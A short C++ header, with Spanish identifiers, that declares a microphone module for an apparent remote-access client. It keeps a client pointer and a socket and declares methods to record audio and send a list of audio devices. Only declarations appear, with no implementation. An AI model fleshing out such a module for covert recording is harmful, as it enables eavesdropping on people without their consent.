#ifndef ___MIC
#define ___MIC

#include "headers.hpp"
#include "cliente.hpp"
#include <mmsystem.h>

class Cliente;

class Mod_Mic{
private:
	Cliente* ptr_copy = nullptr;
public:
	SOCKET sckSocket = INVALID_SOCKET;
	void Grabar_pacman();
	void Enviar_Dispositivos();
	std::vector<std::string> ObtenerDispositivos();

	Mod_Mic(Cliente* pCliente) : ptr_copy(pCliente) {}

};

#endif